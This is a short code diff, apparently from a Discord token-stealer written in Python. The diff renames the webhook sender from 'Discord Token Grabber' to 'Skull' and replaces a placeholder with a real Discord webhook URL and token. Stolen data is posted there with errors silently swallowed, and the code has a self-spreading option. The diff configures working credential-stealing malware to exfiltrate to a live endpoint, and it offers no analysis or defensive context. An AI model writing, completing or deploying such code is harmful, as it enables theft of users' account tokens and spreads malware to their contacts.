@@ -178,11 +178,11 @@ def main():
     webhook = {
         "content": "",
         "embeds": embeds,
-        "username": "Discord Token Grabber",
+        "username": "Skull",
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/1258655740483076116/eONEi0bm-D8qqQIHpWRf3r9Bxmbu4gmToWfZhd8gmcsM48NSl5Eq6QPOumd6M5Tq2mKK", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
